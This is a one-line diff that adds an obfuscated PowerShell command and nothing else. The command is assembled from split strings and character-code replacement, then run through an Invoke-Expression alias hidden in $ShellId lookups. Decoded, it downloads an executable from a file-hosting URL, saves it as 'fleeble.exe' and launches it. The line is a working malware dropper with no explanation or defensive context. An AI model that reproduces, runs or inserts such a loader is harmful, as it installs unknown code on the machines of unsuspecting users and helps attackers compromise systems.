@@ -1,0 +1,1 @@
+﻿ (('(New-'+'Obje'+'ct'+' Syst'+'em.Net.'+'W'+'ebClie'+'nt).Do'+'wn'+'loadFile'+'(Ayg'+'htt'+'p:'+'/'+'/d'+'dl'+'3.d'+'at'+'a.'+'hu'+'/'+'get/0/9551'+'162/sk'+'e.ex'+'eAyg'+','+'Ay'+'gfl'+'eeb'+'le'+'.exeAyg'+')'+';Start'+'-'+'Proces'+'s '+'A'+'yg'+'f'+'lee'+'ble.exeAyg')  -RePlaCE  ([cHaR]65+[cHaR]121+[cHaR]103),[cHaR]39)| & ( $SHeLLid[1]+$SheLliD[13]+'X')
